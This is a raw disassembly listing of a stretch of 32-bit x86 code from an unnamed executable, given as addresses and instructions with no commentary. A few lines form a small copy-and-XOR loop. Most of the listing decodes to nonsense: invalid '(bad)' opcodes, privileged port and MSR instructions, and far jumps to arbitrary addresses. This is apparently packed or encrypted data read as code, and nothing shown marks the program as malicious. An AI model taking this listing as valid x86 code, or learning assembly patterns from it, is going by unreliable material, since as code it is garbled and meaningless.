  40727f:	sti    
  407280:	push   ds
  407281:	sub    al,0xd5
  407283:	sub    BYTE PTR [esi+0x190235ae],ch
  407289:	repz mov edi,0xa597d130
  40728f:	mov    ch,bh
  407291:	mov    WORD PTR [eax+0x5d],?
  407294:	inc    esp
  407295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407296:	add    eax,0xfab2e844
  40729b:	out    0x60,al
  40729d:	push   edi
  40729e:	add    DWORD PTR [esi+0x35fefba1],ebx
  4072a4:	retf   0x6f83
  4072a7:	outs   dx,DWORD PTR ds:[esi]
  4072a8:	repnz push ds
  4072aa:	sub    DWORD PTR [ecx],ebx
  4072ac:	aas    
  4072ad:	xor    al,0xc5
  4072af:	push   edx
  4072b0:	xor    esp,ebx
  4072b2:	sahf   
  4072b3:	jl     0x4072c2
  4072b5:	push   0xbacb288e
  4072ba:	std    
  4072bb:	pop    esp
  4072bc:	pop    ebx
  4072bd:	sub    dh,BYTE PTR [edi]
  4072bf:	dec    ebp
  4072c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072c1:	shl    BYTE PTR [edi+0x8abbc82],1
  4072c7:	push   edx
  4072c8:	mov    al,0xb7
  4072ca:	das    
  4072cb:	test   DWORD PTR [ecx],esi
  4072cd:	add    eax,0x59114ee6
  4072d2:	mov    edi,0xf3ab4782
  4072d7:	fdivrp st(0),st
  4072d9:	rcr    DWORD PTR [edi],cl
  4072db:	mov    BYTE PTR [ebx+ebx*1+0x7172c8bd],ah
  4072e2:	adc    DWORD PTR [ecx+0x3a],0x36
  4072e6:	add    ebp,ebp
  4072e8:	xchg   ebx,eax
  4072e9:	jg     0x407307
  4072eb:	cli    
  4072ec:	ja     0x4072fd
  4072ee:	push   0x75b8be1
  4072f3:	in     al,dx
  4072f4:	fcomp  DWORD PTR [eax+0x2b3a5dbc]
  4072fa:	sahf   
  4072fb:	imul   esi,DWORD PTR [edi+edx*8+0x558c59ca],0x52
  407303:	out    0x51,eax
  407305:	mov    bh,al
  407307:	(bad)  
  407308:	push   DWORD PTR [esi+ebp*1+0x6a]
  40730c:	fidiv  WORD PTR [eax-0x102ed8eb]
  407312:	bound  ecx,QWORD PTR [ebx-0x7ba749d]
  407318:	and    ecx,0x67ef
  40731e:	mov    ecx,0x7510856
  407323:	push   esi
  407324:	mov    esi,DWORD PTR ds:0x4305c6
  40732a:	sub    DWORD PTR ds:0x43051a,esi
  407330:	xor    eax,ecx
  407332:	mov    esi,0x32729d
  407337:	sub    DWORD PTR ds:0x42e7e2,0x43052a
  407341:	add    eax,esi
  407343:	jmp    0x4074db
  407348:	mov    dl,BYTE PTR [ebp-0x1]
  40734b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40734f:	mov    DWORD PTR ds:0x430536,0x7329
  407359:	inc    eax
  40735a:	jmp    0x4074db
  40735f:	mov    WORD PTR [esi],cs
  407361:	jbe    0x407315
  407363:	pushf  
  407364:	pop    edx
  407365:	dec    esp
  407366:	fsub   DWORD PTR [edi+0x7e02235c]
  40736c:	loope  0x407368
  40736e:	scas   eax,DWORD PTR es:[edi]
  40736f:	or     edi,ecx
  407371:	jle    0x4073f1
  407373:	sar    BYTE PTR [edi+0x7e],cl
  407376:	jle    0x407383
  407378:	ds push ebx
  40737a:	add    eax,0x303fb99
  40737f:	cmp    ebp,DWORD PTR [esi+0x9]
  407382:	sbb    eax,0xe007d947
  407387:	fidivr DWORD PTR [esi-0x38]
  40738a:	cwde   
  40738b:	test   bh,dl
  40738d:	and    eax,0x9b8a8bd
  407392:	je     0x40739a
  407394:	lds    ebx,FWORD PTR [esi+0x20]
  407397:	push   ecx
  407398:	mov    fs,WORD PTR [ecx-0x11]
  40739b:	mov    bh,0xc
  40739d:	imul   BYTE PTR [ebp+0x69]
  4073a0:	pop    ds
  4073a1:	arpl   WORD PTR [ebx-0x5624f6d9],sp
  4073a7:	mov    dh,0xdc
  4073a9:	and    eax,DWORD PTR [eax-0x68d10fa]
  4073af:	in     al,0x39
  4073b1:	fist   DWORD PTR [esi+ebp*4-0x45]
  4073b5:	xchg   esi,eax
  4073b7:	or     esp,0x7c
  4073ba:	mov    ds:0x2334e453,eax
  4073bf:	mov    eax,ds:0xb1a81927
  4073c4:	fisttp QWORD PTR [edx+0x6f7d2493]
  4073ca:	add    ah,BYTE PTR [esi+0x1599639f]
  4073d0:	dec    DWORD PTR [edx-0x7c]
  4073d3:	xor    eax,DWORD PTR [ecx+0x7a5d2168]
  4073d9:	pop    edx
  4073da:	jne    0x407429
  4073dc:	push   0xffffffbd
  4073de:	jge    0x407415
  4073e0:	mov    ah,ah
  4073e2:	in     eax,dx
  4073e3:	pop    esi
  4073e4:	dec    eax
  4073e5:	lods   eax,DWORD PTR ds:[esi]
  4073e6:	jl     0x407416
  4073e8:	inc    esi
  4073e9:	adc    DWORD PTR [esi+0x73],edi
  4073ec:	inc    edx
  4073ed:	or     al,0x72
  4073ef:	jle    0x4073b4
  4073f1:	pop    edx
  4073f2:	repnz sete al
  4073f6:	outs   dx,DWORD PTR ds:[esi]
  4073f7:	cdq    
  4073f8:	pop    eax
  4073f9:	xor    bl,BYTE PTR [edx+ebp*1-0x5bd85b31]
  407400:	dec    edx
  407401:	cmp    BYTE PTR [eax-0x3c],0x37
  407405:	mov    cl,BYTE PTR [edi+0x3e420ee4]
  40740b:	jmp    0x4073d4
  40740d:	and    dh,BYTE PTR [ebp+0x14ca028b]
  407413:	add    DWORD PTR [ebx+0x7d907f96],0xc69fee3a
  40741d:	dec    esi
  40741e:	aad    0xf5
  407420:	or     al,BYTE PTR ds:[esi]
  407423:	jnp    0x4073ea
  407425:	sbb    BYTE PTR [ecx],ch
  407427:	data16 mov bh,0xb3
  40742a:	jge    0x407477
  40742c:	outs   dx,DWORD PTR ds:[esi]
  40742d:	test   al,0x57
  40742f:	rcl    DWORD PTR [ebx],cl
  407431:	lahf   
  407432:	fbstp  TBYTE PTR [ebx]
  407434:	mov    ebp,0xf451affd
  407439:	ficom  DWORD PTR [ebx]
  40743b:	gs loopne 0x4074a1
  40743e:	push   eax
  40743f:	sbb    DWORD PTR [edx+0x6580eac1],eax
  407445:	sti    
  407446:	aad    0x4f
  407448:	stos   BYTE PTR es:[edi],al
  407449:	ret    
  40744a:	lods   al,BYTE PTR ds:[esi]
  40744b:	cmp    DWORD PTR ds:0xcfbeed99,ebx
  407451:	add    al,0xe0
  407453:	idiv   edx
  407455:	test   eax,0x3f94873
  40745a:	jnp    0x40742d
  40745c:	mov    dh,0xc2
  40745e:	pop    edi
  40745f:	std    
  407460:	rcl    edx,0x1d
  407463:	test   eax,0x8c8074ea
  407468:	out    dx,al
  407469:	sahf   
  40746a:	xor    ebx,DWORD PTR [ebp-0x4f]
  40746d:	repnz cmp eax,0x5fdc2b74
  407473:	jecxz  0x407431
  407475:	ror    DWORD PTR [ecx+0x7fe479d6],1
  40747b:	fdiv   QWORD PTR [ecx-0x71]
  40747e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40747f:	pop    ebp
  407480:	cmp    BYTE PTR [edi+edi*4],dl
  407483:	jmp    0xf2ed:0xbba062f9
  40748a:	test   esi,edi
  40748c:	(bad)  
  40748d:	popa   
  40748e:	clc    
  40748f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407490:	loop   0x4074ec
  407492:	cmc    
  407493:	outs   dx,DWORD PTR ds:[esi]
  407494:	push   0xc53c98c2
  407499:	sbb    BYTE PTR [ecx],cl
  40749b:	cli    
  40749c:	push   esi
  40749d:	aaa    
  40749e:	xchg   edx,eax
  40749f:	int    0x91
  4074a1:	jnp    0x4074d3
  4074a3:	dec    ebx
  4074a4:	add    edi,DWORD PTR [esi]
  4074a6:	and    esi,DWORD PTR [ebp-0x43]
  4074a9:	cmp    al,0x2a
  4074ab:	push   edx
  4074ac:	clc    
  4074ad:	test   al,0x57
  4074af:	mov    ds:0x63219651,eax
  4074b4:	mov    ecx,0xf30a5808
  4074b9:	js     0x407509
  4074bb:	stos   DWORD PTR es:[edi],eax
  4074bc:	inc    ebx
  4074bd:	ds sub al,0xe0
  4074c1:	and    bh,BYTE PTR [edi]
  4074c3:	push   ecx
  4074c4:	rol    BYTE PTR [ebp+ecx*1-0x1e],cl
  4074c8:	lds    ebx,FWORD PTR [ecx-0x4e95b180]
  4074ce:	mov    dl,BYTE PTR [ebx]
  4074d0:	add    DWORD PTR [edi-0x28],ebp
  4074d3:	out    0xde,al
  4074d5:	mov    eax,ds:0x280c32b6
  4074da:	dec    eax
  4074db:	cmp    eax,0x40
  4074de:	jb     0x407348
  4074e4:	mov    edx,DWORD PTR [ebp-0x8]
  4074e7:	mov    eax,DWORD PTR [ebp-0xc]
  4074ea:	xor    edx,ecx
  4074ec:	add    edx,esi
  4074ee:	cmp    edx,eax
  4074f0:	je     0x407cbb
  4074f6:	push   ebx
  4074f7:	push   edi
  4074f8:	jmp    0x407679
  4074fd:	ins    BYTE PTR es:[edi],dx
  4074fe:	lds    edx,FWORD PTR [edx]
  407500:	cmp    BYTE PTR [ebx-0x1002839b],0xf2
  407507:	xchg   dl,dh
  407509:	fst    DWORD PTR [ebx+0x59]
  40750c:	sub    ebp,ebp
  40750e:	sar    BYTE PTR [esi+0x7e],0xd2
  407512:	jg     0x407592
  407514:	jle    0x40751f
  407516:	jb     0x40749a
  407518:	out    0x93,al
  40751a:	add    eax,0x6c46b3a7
  40751f:	cwde   
  407520:	rcl    cl,0xa4
  407523:	loopne 0x4074e4
  407525:	rol    cl,cl
  407527:	stc    
  407528:	(bad)  
  407529:	dec    edx
  40752a:	(bad)  [esp+ebx*8]
  40752d:	xor    esi,0x960abac1
  407533:	je     0x407512
  407535:	int    0x77
  407537:	cmp    esp,eax
  407539:	mov    eax,0xc7bde24d
  40753e:	je     0x407531
  407540:	push   ax
  407542:	adc    BYTE PTR [ecx+0x68756b39],dl
  407548:	sub    eax,DWORD PTR [edx]
  40754a:	adc    al,0x64
  40754c:	fs pop ebp
  40754e:	lds    ecx,FWORD PTR [esp+eax*4-0x1aefac16]
  407555:	jnp    0x4075c7
  407557:	jle    0x40753b
  407559:	xor    cl,ah
  40755b:	adc    DWORD PTR [esi+edx*4+0x28],eax
  40755f:	mov    bl,0x19
  407561:	mov    dh,0x18
  407563:	icebp  
  407564:	jne    0x4075cf
  407566:	sub    BYTE PTR [esi+edi*1],ah
  407569:	gs xchg esp,eax
  40756b:	dec    esi
  40756c:	inc    edx
  40756d:	test   eax,0xbfb26246
  407572:	add    ch,bh
  407574:	stc    
  407575:	and    esp,DWORD PTR [ebx-0x9f37d85]
  40757b:	inc    eax
  40757c:	add    DWORD PTR [ebp+0x45a3e62a],esp
  407582:	jp     0x4075fa
  407584:	dec    BYTE PTR [edx+ebx*1+0x278c8264]
  40758b:	inc    esp
  40758c:	xor    al,ah
  40758e:	cli    
  40758f:	mov    ch,0x76
  407591:	mov    ebp,ebx
  407593:	jo     0x407573
  407595:	rol    DWORD PTR [ecx],cl
  407597:	outs   dx,BYTE PTR ds:[esi]
  407598:	stos   BYTE PTR es:[edi],al
  407599:	aaa    
  40759a:	push   cs
  40759b:	stc    
  40759c:	adc    eax,0x582143b2
  4075a1:	mov    ds:0x5bef71f9,al
  4075a6:	or     eax,0xa656a6cb
  4075ab:	fwait
  4075ac:	imul   edx,DWORD PTR [ecx-0x14394a1d],0x5a
  4075b3:	jecxz  0x4075f3
  4075b5:	jae    0x407574
  4075b7:	push   ebp
  4075b8:	rol    BYTE PTR [ecx+0x66b0988d],1
  4075be:	(bad)  
  4075bf:	mov    al,ds:0xecc11651
  4075c4:	push   esp
  4075c5:	lds    esi,FWORD PTR [esp+eax*2+0x54]
  4075c9:	cmc    
  4075ca:	(bad)  
  4075cb:	adc    ebx,DWORD PTR ds:0x74d81b40
  4075d1:	fsubp  st(7),st
  4075d3:	in     al,0x92
  4075d5:	cmp    DWORD PTR ds:0x10686915,0xffffffba
  4075dc:	mov    ebx,0x35f60b89
  4075e1:	xor    al,0xe
  4075e3:	sub    eax,DWORD PTR [eax+0x70]
  4075e6:	dec    BYTE PTR [esi-0x1f]
  4075e9:	jo     0x4075b9
  4075eb:	ds loope 0x40760f
  4075ee:	sub    DWORD PTR [ebp-0x42],0x681c72ae
  4075f5:	cs cdq 
  4075f7:	push   edi
  4075f8:	pop    ecx
  4075f9:	sar    DWORD PTR [edi],cl
  4075fb:	ins    BYTE PTR es:[edi],dx
  4075fc:	cmp    al,0x52
  4075fe:	lods   al,BYTE PTR ds:[esi]
  4075ff:	outs   dx,BYTE PTR ds:[esi]
  407600:	out    0x39,al
  407602:	xchg   ebp,eax
  407603:	repz inc ecx
  407605:	jg     0x407655
  407607:	sbb    al,0x4f
  407609:	shl    DWORD PTR ss:[ecx+esi*4+0x458587de],1
  407611:	inc    edi
  407612:	stc    
  407613:	push   edx
  407614:	pop    edi
  407615:	(bad)  
  407616:	sub    al,0xf2
  407618:	sbb    eax,0xf62c91a5
  40761d:	adc    al,0x67
  40761f:	jbe    0x4075dd
  407621:	jnp    0x4075cb
  407623:	cwde   
  407624:	xchg   DWORD PTR [edi],ecx
  407626:	test   al,0xc1
  407628:	xchg   esp,eax
  407629:	jmp    0x32a3daa4
  40762e:	(bad)  
  407630:	add    bl,ah
  407632:	sbb    DWORD PTR [ebx-0x64a02762],ebp
  407638:	xor    ah,cl
  40763a:	js     0x407611
  40763c:	mov    edx,0x599f82d0
  407641:	into   
  407642:	pop    esp
  407643:	jno    0x4076a9
  407645:	push   ss
  407646:	add    BYTE PTR [eax-0x61],dh
  407649:	mov    WORD PTR [ebx+0x76],fs
  40764c:	idiv   DWORD PTR [edx-0x53e1a8be]
  407652:	sbb    BYTE PTR [ecx+0x678aea2c],bl
  407658:	inc    DWORD PTR [bx+si]
  40765b:	cli    
  40765c:	fidivr WORD PTR [ebx-0x57]
  40765f:	scas   eax,DWORD PTR es:[edi]
  407660:	pop    edx
  407661:	hlt    
  407662:	bound  esi,QWORD PTR [edx+0x7c]
  407665:	mov    ds:0x23dde1c1,al
  40766a:	push   ebx
  40766b:	mov    bl,0x97
  40766d:	sbb    eax,0xc97300c1
  407672:	jnp    0x4075ff
  407674:	pop    esp
  407675:	(bad)  
  407677:	or     eax,0x87d8bdc
  40767c:	jmp    0x4077fd
  407681:	jae    0x40766e
  407683:	cmp    al,ah
  407685:	cli    
  407686:	vpaddw ymm3,ymm2,YMMWORD PTR [eax+eax*1]
  40768b:	inc    DWORD PTR [ecx]
  40768d:	xchg   edx,eax
  40768e:	mov    esp,0xc141b672
  407693:	jle    0x407713
  407695:	sar    BYTE PTR [edi+0x7e],cl
  407698:	jle    0x40762f
  40769a:	repnz ds xchg ebx,eax
  40769d:	repz fsub QWORD PTR [edx]
  4076a0:	push   esp
  4076a1:	shld   DWORD PTR [esi+0x658f2f7e],eax,0xf1
  4076a9:	adc    dh,dh
  4076ab:	inc    ebp
  4076ac:	imul   esi,edi,0xb1bee5f8
  4076b2:	ror    DWORD PTR [ebx],1
  4076b4:	into   
  4076b5:	xchg   BYTE PTR [edi+edi*2-0x5a468546],al
  4076bc:	pop    ss
  4076bd:	add    cl,bh
  4076bf:	arpl   WORD PTR [eax-0x4d],ax
  4076c2:	mov    WORD PTR [ebx-0x7e],ds
  4076c5:	test   DWORD PTR [esi+0x5],edx
  4076c8:	push   edi
  4076c9:	jb     0x407654
  4076cb:	loope  0x4076e9
  4076cd:	mov    ch,0xcc
  4076cf:	jne    0x40767a
  4076d1:	loopne 0x407713
  4076d3:	shl    DWORD PTR [ebp-0x7f1eac3],1
  4076d9:	retf   0x4304
  4076dc:	jle    0x407738
  4076de:	push   ds
  4076df:	cdq    
  4076e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076e1:	out    dx,eax
  4076e2:	add    BYTE PTR [edx*4+0x10a36221],bh
  4076e9:	in     al,dx
  4076ea:	mov    al,ds:0x66a2f832
  4076ef:	adc    BYTE PTR [edx-0x12],0xd5
  4076f3:	mov    ah,ch
  4076f5:	scas   al,BYTE PTR es:[edi]
  4076f6:	ins    DWORD PTR es:[edi],dx
  4076f7:	xor    DWORD PTR [edx],eax
  4076f9:	scas   eax,DWORD PTR es:[edi]
  4076fa:	xor    dh,BYTE PTR [ebp+0x1a]
  4076fd:	push   cs
  4076fe:	(bad)  
  407700:	sub    bl,bl
  407702:	or     eax,0xe8671d
  407707:	je     0x407774
  407709:	pop    ss
  40770a:	dec    ecx
  40770b:	jns    0x4076be
  40770d:	push   edi
  40770e:	mov    DWORD PTR [ecx],esi
  407710:	mov    bl,0xdb
  407712:	popf   
  407713:	pop    eax
  407714:	push   edx
  407715:	lods   al,BYTE PTR ds:[esi]
  407716:	pop    ss
  407717:	push   edx
  407718:	stc    
  407719:	gs push ss
  40771b:	jbe    0x407761
  40771d:	jne    0x4076e1
  40771f:	sub    DWORD PTR [edx],edi
  407721:	dec    ebp
  407722:	aam    0x43
  407724:	sub    al,0x33
  407726:	push   ss
  407727:	mov    WORD PTR [esp+edi*1+0x2a8f0d1b],fs
  40772e:	sbb    ecx,DWORD PTR [edi+0x6b1b4f0a]
  407734:	dec    esp
  407735:	mov    cl,0xed
  407737:	or     cl,BYTE PTR [edi+0x11ce01af]
  40773d:	lahf   
  40773e:	mov    ebx,0x5e3832de
  407743:	mov    esp,0xe4b6576f
  407748:	pusha  
  407749:	or     al,0x35
  40774b:	jecxz  0x4076f9
  40774d:	not    BYTE PTR [edx]
  40774f:	sub    eax,0x9c1803fd
  407754:	or     eax,0xfbe33b10
  407759:	inc    esp
  40775a:	pop    ss
  40775b:	or     BYTE PTR [ebx+0x6a],cl
  40775e:	outs   dx,BYTE PTR ds:[esi]
  40775f:	nop
  407760:	mov    ecx,0x830d3e08
  407765:	cdq    
  407766:	add    eax,0xa83af116
  40776b:	iret   
  40776c:	inc    edi
  40776d:	xor    ebp,edx
  40776f:	aas    
  407770:	mov    eax,ds:0x472366da
  407775:	sbb    al,0x78
  407777:	mov    eax,0x2e5529b5
  40777c:	cmp    BYTE PTR [edi+0x7d2d927c],bl
  407782:	pop    es
  407783:	test   eax,0x339fd9a8
  407788:	cmp    al,0xf8
  40778a:	pop    esp
  40778c:	pop    ebx
  40778d:	or     edx,DWORD PTR [edx+edi*8+0x29]
  407791:	loopne 0x407758
  407793:	or     eax,0xb6b0e481
  407798:	fld    DWORD PTR [eax]
  40779a:	jl     0x4077da
  40779c:	aam    0x1e
  40779e:	and    al,0xe4
  4077a0:	mov    al,ds:0xb73fb315
  4077a5:	(bad)  
  4077a6:	out    dx,al
  4077a7:	or     BYTE PTR [eax-0x1a715746],al
  4077ad:	daa    
  4077ae:	mov    esi,0x1dd98360
  4077b3:	sub    edx,DWORD PTR [ecx]
  4077b5:	cmp    al,0xf5
  4077b7:	xor    cl,BYTE PTR [ebp-0x32]
  4077ba:	rol    BYTE PTR [eax],0xc4
  4077bd:	std    
  4077be:	pop    ds
  4077bf:	xlat   BYTE PTR ds:[ebx]
  4077c0:	xchg   esi,eax
  4077c1:	add    DWORD PTR [ecx+0x5a],edx
  4077c4:	cs push esi
  4077c6:	push   ebx
  4077c7:	test   DWORD PTR [edx+0x77],0xbd199706
  4077ce:	push   esp
  4077cf:	sub    al,0xdb
  4077d1:	lahf   
  4077d2:	dec    esi
  4077d3:	lock adc DWORD PTR [eax+0x3bbc4b34],ebx
  4077da:	xor    ebp,DWORD PTR [esi+eax*8+0x37be1194]
  4077e1:	add    eax,ebx
  4077e3:	dec    edi
  4077e4:	sbb    eax,0xdc3830d2
  4077e9:	(bad)  
  4077ea:	jge    0x407860
  4077ec:	hlt    
  4077ed:	sub    bl,cl
  4077ef:	dec    ecx
  4077f0:	ret    
  4077f1:	dec    eax
  4077f2:	sbb    BYTE PTR [ebp-0x5f3efff1],0x13
  4077f9:	test   DWORD PTR [ecx+0x40b80350],eax
  4077ff:	mov    al,BYTE PTR [eax]
  407801:	add    BYTE PTR [esi+0x33],ah
  407804:	inc    esp
  407805:	xchg   edi,eax
  407806:	add    bh,BYTE PTR [edi+0x3b06]
  40780c:	add    ax,di
  40780f:	jmp    0x407990
  407814:	push   ebp
  407815:	fsub   DWORD PTR [edx+0x557cbb2e]
  40781b:	pop    ebp
  40781c:	xchg   ecx,esp
  40781e:	push   0xd
  407820:	add    ebx,eax
  407822:	adc    ebx,DWORD PTR [edi+0x7e7ec325]
  407828:	sar    BYTE PTR [edi+0x7e],cl
  40782b:	jle    0x407893
  40782d:	fadd   DWORD PTR [edx+0x8]
  407830:	jbe    0x40784c
  407832:	ja     0x407856
  407834:	cmp    bh,BYTE PTR [di-0x2]
  407838:	and    eax,0x5b2d46c9
  40783d:	sbb    bh,bh
  40783f:	out    dx,al
  407840:	jge    0x40783b
  407842:	adc    eax,0x6479ef68
  407847:	jae    0x4077d5
  407849:	addr16 mov esi,0xc35b9375
  40784f:	mov    dl,0x97
  407851:	retf   0x5794
  407854:	jae    0x40788e
  407856:	mov    cl,BYTE PTR [ebp+0x2c]
  407859:	shl    DWORD PTR [edx+0x34bcf19b],cl
  40785f:	mov    esi,0xdd58418
  407864:	imul   edx,DWORD PTR [eax-0x1d2464e7],0x71
  40786b:	es mov ebx,0xe566d1a3
  407871:	ja     0x4078e4
  407873:	xchg   esp,eax
  407874:	or     al,0x67
  407876:	dec    esi
  407877:	fisttp WORD PTR [edx-0x336c484d]
  40787d:	mov    edx,DWORD PTR [ebx+0x4f]
  407880:	sbb    BYTE PTR [ebx+0x5e],ah
  407883:	dec    ebx
  407884:	jle    0x4078e6
  407886:	or     BYTE PTR [edi+0x3f],bl
  407889:	sub    esi,esi
  40788b:	sub    BYTE PTR [esi-0x1c9dd609],cl
  407891:	mov    esi,0xd2e20c5
  407896:	in     al,dx
  407897:	pop    esi
  407898:	jne    0x40781a
  40789a:	sub    ch,BYTE PTR fs:[ebp+0x33761857]
  4078a1:	xor    eax,0x98aa234c
  4078a6:	pop    esp
  4078a7:	loopne 0x40785c
  4078a9:	push   ss
  4078aa:	mov    bh,0x4e
  4078ac:	js     0x4078f4
  4078ae:	sub    edi,DWORD PTR [ecx-0x5040f51c]
  4078b4:	pop    eax
  4078b5:	dec    esi
  4078b6:	ja     0x4078c8
  4078b8:	mov    esi,0x1c0d5eff
  4078bd:	call   0x256:0x1b33b203
  4078c4:	mov    ds:0x754e1742,al
  4078c9:	pop    esi
  4078ca:	bound  eax,QWORD PTR [eax+0x53261b97]
  4078d0:	mov    edi,0xd0af37f1
  4078d5:	inc    ebx
  4078d6:	cdq    
  4078d7:	jbe    0x4078a8
  4078d9:	cmp    esp,DWORD PTR [edi-0x2d8b316a]
  4078df:	inc    esp
  4078e0:	imul   edx,DWORD PTR [esi],0xffffffc6
  4078e3:	mov    ebx,0xe07d9363
  4078e8:	aad    0xb9
  4078ea:	inc    ecx
  4078eb:	js     0x407872
  4078ed:	cmp    DWORD PTR [esi],esp
  4078ef:	or     eax,eax
  4078f1:	pop    ss
  4078f2:	test   al,0xae
  4078f4:	test   eax,0x1d42245
  4078f9:	ret    
  4078fa:	pop    esi
  4078fb:	pop    edi
  4078fc:	es std 
  4078fe:	pop    eax
  4078ff:	jp     0x4078b1
  407901:	loop   0x40793d
  407903:	push   eax
  407904:	inc    ebx
  407905:	mov    dh,0x80
  407907:	pop    es
  407908:	xchg   BYTE PTR ds:0xeef9b8ae,dh
  40790e:	stc    
  40790f:	or     DWORD PTR [eax-0x36],ebp
  407912:	test   BYTE PTR [ecx-0x2c0ebfd1],dl
  407918:	aaa    
  407919:	data16 std 
  40791b:	dec    esi
  40791c:	shl    BYTE PTR [ecx-0x472d3573],1
  407922:	xchg   ebx,esp
  407924:	icebp  
  407925:	fisub  DWORD PTR [ecx]
  407927:	rcr    DWORD PTR [esi],cl
  407929:	mov    ds:0xcf79f664,eax
  40792e:	pop    esp
  40792f:	add    edx,esi
  407931:	add    DWORD PTR [edx-0x5d],esp
  407934:	push   edx
  407935:	sbb    al,0xbd
  407937:	leave  
  407938:	mov    ebp,0x9397e0e5
  40793d:	push   esi
  40793e:	lea    esi,[ebp-0x400a0473]
  407944:	cmp    edi,edx
  407946:	push   es
  407947:	pop    ss
  407948:	test   eax,0xb993a555
  40794d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40794e:	push   eax
  40794f:	add    edi,edi
  407951:	fcomp  DWORD PTR [ecx]
  407953:	xor    BYTE PTR cs:[ecx+ecx*1-0x2ae37871],ah
  40795b:	je     0x4079a3
  40795d:	enter  0x1bfa,0x52
  407961:	jne    0x407929
  407963:	dec    edi
  407964:	dec    edi
  407965:	inc    ecx
  407966:	out    dx,al
  407967:	call   0xf19488d6
  40796c:	popf   
  40796d:	dec    edx
  40796e:	outs   dx,BYTE PTR ds:[esi]
  40796f:	push   ds
  407970:	xchg   esi,eax
  407971:	inc    eax
  407972:	in     al,dx
  407973:	xor    esp,ecx
  407975:	xchg   esp,eax
  407976:	in     eax,dx
  407977:	lahf   
  407978:	loop   0x4079ad
  40797a:	sahf   
  40797b:	xchg   dh,dh
  40797d:	lds    ecx,FWORD PTR [edi-0x12]
  407980:	mov    dh,0x15
  407982:	mov    edi,0xbc9d0c45
  407987:	xchg   ecx,eax
  407988:	or     DWORD PTR [eax-0x7a],ecx
  40798b:	in     eax,0x2e
  40798d:	je     0x4079bd
  40798f:	jmp    0x8a0130a3
  407994:	inc    ebp
  407995:	in     al,dx
  407996:	jmp    0x407b17
  40799b:	xchg   ebx,eax
  40799c:	(bad)  
  40799d:	sbb    ebp,edi
  40799f:	cmp    edi,DWORD PTR [ebx+0x6b]
  4079a2:	inc    edx
  4079a3:	push   sp
  4079a5:	cwde   
  4079a6:	pop    edi
  4079a7:	xor    edx,DWORD PTR [esi]
  4079a9:	pop    ecx
  4079aa:	ret    
  4079ab:	cdq    
  4079ac:	les    edi,FWORD PTR [esi+0x7e]
  4079af:	sar    BYTE PTR [edi+0x7e],cl
  4079b2:	jle    0x4079ed
  4079b4:	(bad)  [ecx-0x74]
  4079b7:	or     BYTE PTR [ecx],bh
  4079b9:	dec    edx
  4079ba:	cmp    ebx,esi
  4079bc:	xchg   DWORD PTR [ebx-0x14],esi
  4079bf:	or     al,0xe1
  4079c1:	cmp    DWORD PTR [edx-0x51],0xffffffcd
  4079c5:	out    dx,eax
  4079c6:	jp     0x40797a
  4079c8:	mov    ah,0x91
  4079ca:	xchg   esi,eax
  4079cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079cc:	lds    esp,FWORD PTR [edi+0x395b3695]
  4079d2:	jecxz  0x4079f4
  4079d4:	push   ss
  4079d5:	jge    0x4079e3
  4079d7:	adc    ebx,DWORD PTR [ebp+0x1b42f64c]
  4079dd:	in     al,dx
  4079de:	dec    esi
  4079df:	aaa    
  4079e0:	into   
  4079e1:	pop    edi
  4079e2:	lods   eax,DWORD PTR ds:[esi]
  4079e3:	cdq    
  4079e4:	or     eax,0xfa063230
  4079e9:	mov    cl,0x14
  4079eb:	ds wrmsr 
  4079ee:	jno    0x407973
  4079f0:	int3   
  4079f1:	adc    edx,DWORD PTR [edx]
  4079f3:	sbb    esp,DWORD PTR [ebp+esi*2+0x4afdf907]
  4079fa:	lea    esp,[ecx]
  4079fc:	inc    DWORD PTR [esi]
  4079fe:	les    edx,FWORD PTR [ecx+0xb]
  407a01:	rcl    bl,1
  407a03:	fbstp  TBYTE PTR [eax-0x5e]
  407a06:	cld    
  407a07:	repz retf 
  407a09:	push   esi
  407a0a:	gs stos BYTE PTR es:[edi],al
  407a0c:	inc    esp
  407a0d:	adc    bh,cl
  407a0f:	mov    al,0x11
  407a11:	je     0x407a7f
  407a13:	fisubr WORD PTR [esp+ebp*2]
  407a16:	(bad)  
  407a17:	call   FWORD PTR [ebx+0x53f7bf2b]
  407a1d:	or     dh,BYTE PTR [esi+0x28]
  407a20:	add    BYTE PTR [esi],dh
  407a22:	push   ss
  407a23:	xor    DWORD PTR [ebx],ecx
  407a25:	sbb    BYTE PTR [esi+0x38],0x5b
  407a29:	(bad)  
  407a2a:	or     al,0xd2
  407a2c:	and    al,0x32
  407a2e:	ja     0x4079df
  407a30:	add    ch,BYTE PTR [ebp+0x3c533699]
  407a36:	inc    edi
  407a37:	in     al,0xfb
  407a39:	and    esi,DWORD PTR [edi]
  407a3b:	jl     0x407a6a
  407a3d:	scas   al,BYTE PTR es:[edi]
  407a3e:	cli    
  407a3f:	mov    bh,BYTE PTR [ebp+0x31]
  407a42:	push   0xf0a4f622
  407a47:	lock jo 0x4079ea
  407a4a:	cmp    eax,0x59873653
  407a4f:	mov    dl,0xb3
  407a51:	jmp    0x39ff:0x3d9dc3ca
  407a58:	es fwait
  407a5a:	jmp    0x91558779
  407a5f:	push   ecx
  407a60:	ror    BYTE PTR [ecx],0xde
  407a63:	fild   QWORD PTR [edi]
  407a65:	(bad)  
  407a66:	xchg   esp,eax
  407a67:	out    0xd0,al
  407a69:	jle    0x407a69
  407a6b:	jmp    0x483f2a4c
  407a70:	dec    ebx
  407a71:	dec    edx
  407a72:	pop    ds
  407a73:	mov    esp,0xa517bd8d
  407a78:	sbb    dl,dh
  407a7a:	int3   
  407a7b:	cmp    dh,BYTE PTR [edi+edx*1-0x23c52b7f]
  407a82:	sbb    dh,BYTE PTR [ebx]
  407a84:	or     BYTE PTR [edi],dh
  407a86:	shl    cl,cl
  407a88:	mov    esi,0xc8894623
  407a8d:	shr    BYTE PTR [ecx],0x5a
  407a90:	aas    
  407a91:	xor    DWORD PTR ds:0xa1f4e9a6,ebp
  407a97:	jns    0x407a6f
  407a99:	fcom   st(0)
  407a9b:	pop    edi
  407a9c:	mov    bh,0x2e
  407a9e:	in     eax,0x9
  407aa0:	out    0x58,al
